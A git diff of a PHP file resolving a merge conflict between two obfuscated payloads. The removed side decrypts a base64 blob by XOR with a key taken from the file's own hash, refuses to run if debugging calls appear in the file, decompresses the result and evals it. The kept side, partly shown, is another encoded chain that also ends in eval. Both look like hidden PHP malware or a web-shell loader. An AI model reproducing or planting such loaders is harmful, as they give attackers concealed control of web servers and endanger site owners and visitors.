@@ -1,29 +1,4 @@
 <?php
-<<<<<<< Updated upstream
-$wjfywppk="8ebeda5f4b5c685182beb438bedf0d36";
-$ookbfqmrz="0d5d57535657030001000d50060e0d500802525252520b0f065453500955570f";
-$mgtexolz="TeKgYn9Z7CYl3xvCL9BYqIbUuG0JIrg1DqO9ZUOQ7mN0vCNNkh2vU+8/P4hlyUMGjc4ytJo8JNv9BljoRRC8OOCpcD6tufGTRkiMf6MynTsfE7kf5BIAL2oDUsuWWOiwb4eHVctgzMSxSz1XauwwoWyTuCIMV73hUC3LKDex+prRJ3kVCrEYJdyrjjq/Vq/oeMNk91Z1nXUNqHLsShnZNfXB1X/wwH4JP/caJ43zY74iZCl9HkBp363VCA6fXNCaSkpAAZkj9EU9XnlugnHQ2ukuxTzjCnMiGpQxTEd8lN5jBZEedN/Dow9TKWKiHFWk3EUlfuT/LAKmA4pHBUjKiwYipG4FhmKZYbBc23kvtQGxKpIDpVcvA0M0DK8nUZXcLpwn+iBi241XWJ3XZDFva5ntKz1q34HMivIrCheFa5Q4HkAHJ2lfi/vCgFcamAh0Z6m6pdnKkgDywe/a5Fy9PqNDqjQKRtfr8gHSVt7Nr+NKqJLzxHxw5GT0SJfUrz0FlXIBIUkzaOoO9B0p8gY3Io+jsZWmQJBuYSKPRPCNVV1h00l4Y+WdR3O4u6ZGKT7st8QpZn/Od9FWLre/Id+nIq/Pp/HV2hkBjjund4mTTHE78kt5Xnzpfh2cFEK+ZVokUL+Lh+9+xjrOySzU9ON1zWq7Set61TO415e31jviQI+d3oax+ZLPecwMWco9wTeKHrKOJePofr6difOuMGokAsRzeYPla24DX+PX3v3l106mK6lk";
-$bdzgrezrct=file_get_contents(__FILE__);
-$ouqeehts=str_replace($mgtexolz,"",$bdzgrezrct);
-if(strpos($ouqeehts,"ec"."ho")!==false||strpos($ouqeehts,"pr"."int")!==false||strpos($ouqeehts,"var_"."dump")!==false||strpos($ouqeehts,"file_put_"."contents")!==false||strpos($ouqeehts,"fw"."rite")!==false){die();}
-$tgfeaiqk=str_replace(array($wjfywppk,$ookbfqmrz),array("SP_9ce451ef","KP_c4df7039"),$bdzgrezrct);
-$zkfkpj=md5($tgfeaiqk);
-$udwaqiykht=hex2bin($ookbfqmrz);
-$dlyslbkf="";
-$njxqkoih=strlen($zkfkpj);
-for($dokbbba=0;$dokbbba<$njxqkoih;$dokbbba++){
-$dlyslbkf.=chr(ord($udwaqiykht[$dokbbba])^ord($zkfkpj[$dokbbba]));
-}
-$oymayp=base64_decode($mgtexolz);
-$hshljc=strlen($oymayp);
-$fhpohlhtnt="";
-$yhbbpsdv=strlen($dlyslbkf);
-for($dokbbba=0;$dokbbba<$hshljc;$dokbbba++){
-$fhpohlhtnt.=$oymayp[$dokbbba]^$dlyslbkf[$dokbbba%$yhbbpsdv];
-}
-$oavjgc="gzun"."compress";
-eval($oavjgc($fhpohlhtnt));
-=======
 // 7a477ca7a61a4906f7833dda
 $tfNWuuSTNQT_="amLa+gW5b8k2mMkWH4yjVs2tw1cyBG4VNgYTK4HYpb0=";
 $tc_GygNdkJL="nzYn+tJ5o8x2zZxJU4lwIf2gj1plOT4IAtLGX4ULco0=";
@@ -52,4 +27,3 @@ $Sa_BBTjCskzx=$ZTprTbgpqHvlIk($Sa_BBTjCskzx);
 $Sa_BBTjCskzx=$bEcxOKNuGbdLk($Sa_BBTjCskzx);
 $Sa_BBTjCskzx=$rgVhMjSwK($Sa_BBTjCskzx);
 eval($Sa_BBTjCskzx);
->>>>>>> Stashed changes
